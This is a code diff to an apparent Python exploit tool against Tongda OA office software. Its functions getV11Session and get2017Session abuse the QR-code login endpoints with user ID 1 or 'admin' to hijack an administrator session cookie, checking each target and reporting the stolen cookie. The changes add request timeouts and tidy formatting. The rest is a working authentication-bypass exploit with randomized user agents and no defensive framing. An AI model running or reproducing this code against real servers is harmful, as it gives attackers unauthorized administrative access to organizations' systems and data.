@@ -45,7 +45,7 @@ USER_AGENTS = [
 headers = {}
 
 
-def getV11Session(url):
+def getV11Session(url,timeout):
     checkUrl = url + '/general/login_code.php'
     try:
         headers["User-Agent"] = choice(USER_AGENTS)
@@ -54,46 +54,45 @@ def getV11Session(url):
         codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
         getSessUrl = url + '/logincheck_code.php'
         res = requests.post(
-            getSessUrl, data={'CODEUID': '{' + codeUid + '}', 'UID': int(1)}, headers=headers)
+            getSessUrl, data={'CODEUID': '{' + codeUid + '}', 'UID': int(1)}, headers=headers,timeout=timeout)
         tmp_cookie = res.headers['Set-Cookie']
         headers["User-Agent"] = choice(USER_AGENTS)
         headers["Cookie"] = tmp_cookie
-        check_available = requests.get(url + '/general/index.php', headers=headers)
+        check_available = requests.get(url + '/general/index.php', headers=headers,timeout=timeout)
         if '用户未登录' not in check_available.text:
             if '重新登录' not in check_available.text:
                 return '成功获取cookie:' + tmp_cookie
         else:
             return 'Something Wrong With ' + url + ',Maybe Not Vulnerable.'
     except:
-        return '[-]Something Wrong With ' + url
+        return 'Something Wrong With ' + url
 
 
-
-def get2017Session(url):
-    checkUrl = url+'/ispirit/login_code.php'
+def get2017Session(url,timeout):
+    checkUrl = url + '/ispirit/login_code.php'
     try:
         headers["User-Agent"] = choice(USER_AGENTS)
-        res = requests.get(checkUrl,headers=headers)
+        res = requests.get(checkUrl, headers=headers)
         resText = json.loads(res.text)
         codeUid = resText['codeuid']
-        codeScanUrl = url+'/general/login_code_scan.php'
+        codeScanUrl = url + '/general/login_code_scan.php'
         res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(
-            1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers)
+            1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'}, headers=headers,timeout=timeout)
         resText = json.loads(res.text)
         status = resText['status']
         if status == str(1):
-            getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid
+            getCodeUidUrl = url + '/ispirit/login_code_check.php?codeuid=' + codeUid
             res = requests.get(getCodeUidUrl)
             tmp_cookie = res.headers['Set-Cookie']
             headers["User-Agent"] = choice(USER_AGENTS)
             headers["Cookie"] = tmp_cookie
-            check_available = requests.get(url + '/general/index.php',headers=headers)
+            check_available = requests.get(url + '/general/index.php', headers=headers,timeout=timeout)
             if '用户未登录' not in check_available.text:
                 if '重新登录' not in check_available.text:
-                    return '成功获取cookie' + tmp_cookie
+                    return '成功获取cookie:' + tmp_cookie
             else:
-                return '[Something Wrong With ' + url + ',Maybe Not Vulnerable.'
+                return 'Something Wrong With ' + url + ',Maybe Not Vulnerable.'
         else:
-            return 'Something Wrong With '+url  + ' Maybe Not Vulnerable ?'
+            return 'Something Wrong With ' + url + ' Maybe Not Vulnerable ?'
     except:
-        return 'Something Wrong With'+url
+        return 'Something Wrong With' + url
